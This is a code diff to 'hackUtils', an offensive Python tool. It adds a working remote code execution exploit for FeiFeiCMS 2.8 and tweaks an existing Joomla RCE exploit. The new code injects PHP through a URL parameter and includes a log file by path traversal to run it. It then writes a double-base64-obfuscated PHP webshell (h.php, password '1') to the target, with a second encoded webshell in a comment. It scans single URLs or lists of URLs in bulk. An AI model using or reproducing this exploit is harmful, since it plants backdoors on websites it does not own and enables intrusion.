@@ -474,9 +474,9 @@ def getInfoByJoomlaRCE(result, param):
     if "System" in param:
         reg = '.*<tr><td class="e">System </td><td class="v">([^<>]*?)</td></tr>.*'
     elif "DOCUMENT_ROOT" in param:	
-        reg = '.*<tr><td class="e">DOCUMENT_ROOT </td><td class="v">([^<>]*?)</td></tr>.*'
+        reg = '.*<tr><td class="e">_SERVER\["DOCUMENT_ROOT"\]</td><td class="v">([^<>]*?)</td></tr>.*'
     elif "SCRIPT_FILENAME" in param:
-        reg = '.*<tr><td class="e">SCRIPT_FILENAME </td><td class="v">([^<>]*?)</td></tr>.*'
+        reg = '.*<tr><td class="e">_SERVER\["SCRIPT_FILENAME"\]</td><td class="v">([^<>]*?)</td></tr>.*'
     match_url = re.search(reg,result)
     if match_url:
        info=match_url.group(1)
@@ -500,10 +500,84 @@ def getShellByJoomlaRCE(url, system, script_filename):
             return "no info!"
     else:
         return "no info!"
+
+def rceFeiFeiCMS(value):
+    now = time.strftime('%H:%M:%S',time.localtime(time.time()))
+    print "["+str(now)+"] [INFO] Checking FeiFeiCMS 2.8 Remote Code Execution..."
+    if 'http://' in value or 'https://' in value:
+    	url=value
+    	checkFeiFeiCMS(url)
+    else:
+    	urlfile=open(value,'r')
+    	for url in urlfile:
+            if url.strip():
+                checkFeiFeiCMS(url)
+    	urlfile.close()
+    output = os.path.dirname(os.path.realpath(__file__))+"/feifeicms_rce.txt"
+    if os.path.exists(output):
+        print "\n[INFO] Scanned Vuls:"
+        print "[*] Output File: "+output
+
+def checkFeiFeiCMS(url):    
+    url = url.strip()
+    reg = 'http[s]*://.*/$'
+    m = re.match(reg,url)
+    if not m:
+        url = url + "/"
+    logfilename=str(time.strftime('%y_%m_%d',time.localtime(time.time())))+".log.html"
+    poc_1 = url+"index.php?s=my-show-id-1{~phpinfo()}.html"
+    poc_2 = url+"index.php?s=my-show-id-\\..\\Runtime\\Logs\\"+logfilename
+    try:
+        result = exploitFeiFeiCMS(poc_1,poc_2)
+        if 'phpinfo()' in result:
+            system = getInfoByFeiFeiCMS(result, 'System')
+            document_root = getInfoByFeiFeiCMS(result, 'DOCUMENT_ROOT')
+            script_filename = getInfoByFeiFeiCMS(result, 'SCRIPT_FILENAME')
+            shell_file = getShellByFeiFeiCMS(url)
+            vuls='[+] vuls found! url: '+url+', System: '+system+', document_root: '+document_root+', script_filename: '+script_filename+', shell_file: '+shell_file
+            logfile(vuls,'feifeicms_rce.txt')
+            print vuls
+        else:
+            print '[!] no vuls! url: '+url
+    except Exception,e:
+        print '[!] connection failed! url: '+url
+
+def exploitFeiFeiCMS(p1, p2):
+    requests.get(p1, timeout=10)
+    response = requests.get(p2, timeout=10) 
+    return response.content
+
+def getInfoByFeiFeiCMS(result, param):
+    if "System" in param:
+        reg = '.*<tr><td class="e">System </td><td class="v">([^<>]*?)</td></tr>.*'
+    elif "DOCUMENT_ROOT" in param:
+        reg = '.*<tr><td class="e">_SERVER\["DOCUMENT_ROOT"\]</td><td class="v">([^<>]*?)</td></tr>.*'
+    elif "SCRIPT_FILENAME" in param:
+        reg = '.*<tr><td class="e">_SERVER\["SCRIPT_FILENAME"\]</td><td class="v">([^<>]*?)</td></tr>.*'
+    match_url = re.search(reg,result)
+    if match_url:
+       info=match_url.group(1)
+    else:
+        info = 'no info!'
+    return info
+
+def getShellByFeiFeiCMS(url):
+    logfilename=str(time.strftime('%y_%m_%d',time.localtime(time.time())))+".log.html"
+    #cmd ="file_put_contents('1ndex.php',base64_decode(base64_decode('UEQ5d2FIQWdhV1lvSVNSZlVFOVRWRnNuYUdGdVpHeGxKMTBwZTJobFlXUmxjaWduU0ZSVVVDOHhMakVnTkRBMElFNXZkQ0JHYjNWdVpDY3BPeUJsZUdsMEtDazdJSDFsYkhObGV5QWtjejBpY0NJdUluSWlMaUpsSWk0aVp5SXVJbDhpTGlKeUlpNGlaU0l1SW5BaUxpSnNJaTRpWVNJdUltTWlMaUpsSWpzZ0pITW9JbjViWkdselkzVjZYWDVsSWl3a1gxQlBVMVJiSjJoaGJtUnNaU2RkTENKQlkyTmxjM01pS1RzZ2ZTQS9QZz09')))"  #password: handle
+    #cmd = "file_put_contents('wooyun.txt','wooyun')"
+    shell = 'h.php'
+    cmd ="file_put_contents('"+shell+"',base64_decode(base64_decode('UEQ5d2FIQWdRR1YyWVd3b0pGOVFUMU5VV3ljeEoxMHBPejgr')))" #password: 1
+    payload_l = url+"index.php?s=my-show-id-1{~"+str(cmd)+"}.html"
+    payload_2 = url+"index.php?s=my-show-id-\\..\\Runtime\\Logs\\"+logfilename
+    try:
+        exploitFeiFeiCMS(payload_l, payload_2)
+        return url+shell
+    except Exception, e:
+        return "no info!"
     
 def myhelp():
     print "\n+-----------------------------+"
-    print "|  hackUtils v0.0.3           |"
+    print "|  hackUtils v0.0.4           |"
     print "|  Avfisher - avfisher.win    |"
     print "|  security_alert@126.com     |"
     print "+-----------------------------+\n"
@@ -515,6 +589,7 @@ def myhelp():
     print "  -w keyword, --wooyun=keyword                        Fetch URLs from Wooyun Corps based on specific keyword"
     print "  -j url|file, --joomla=url|file                      Exploit SQLi for Joomla 3.2 - 3.4"
     print "  -r url|file, --rce=url|file                         Exploit Remote Code Execution for Joomla 1.5 - 3.4.5 (Password: handle)"
+    print "  -f url|file, --feifeicms=url|file                   Exploit Remote Code Execution for FeiFeiCMS 2.8 (Password: 1)"
     print "  -d site, --domain=site                              Scan subdomains based on specific site"
     print "  -e string, --encrypt=string                         Encrypt string based on specific encryption algorithms (e.g. base64, md5, sha1, sha256, etc.)"
     print "\nExamples:"
@@ -525,13 +600,15 @@ def myhelp():
     print "  hackUtils.py -j urls.txt"
     print "  hackUtils.py -r http://www.joomla.com/"
     print "  hackUtils.py -r urls.txt"
+    print "  hackUtils.py -f http://www.feifeicms.com/"
+    print "  hackUtils.py -f urls.txt"
     print "  hackUtils.py -d example.com"
     print "  hackUtils.py -e text"
     print "\n[!] to see help message of options run with '-h'"
 
 def main():
     try:
-        options,args = getopt.getopt(sys.argv[1:],"hb:g:w:j:r:d:e:",["help","baidu=","google=","wooyun=","joomla=","rce=","domain=","encrypt="])
+        options,args = getopt.getopt(sys.argv[1:],"hb:g:w:j:r:f:d:e:",["help","baidu=","google=","wooyun=","joomla=","rce=","feifeicms=","domain=","encrypt="])
     except getopt.GetoptError:
         print "\n[WARNING] error, to see help message of options run with '-h'"
         sys.exit()
@@ -549,6 +626,8 @@ def main():
             checkJoomla(value)
         if name in ("-r","--rce"):
             rceJoomla(value)
+        if name in ("-f","--feifeicms"):
+            rceFeiFeiCMS(value)
         if name in ("-d","--domain"):
             scanSubDomains('baidu',value,50)
         if name in ("-e","--encrypt"):
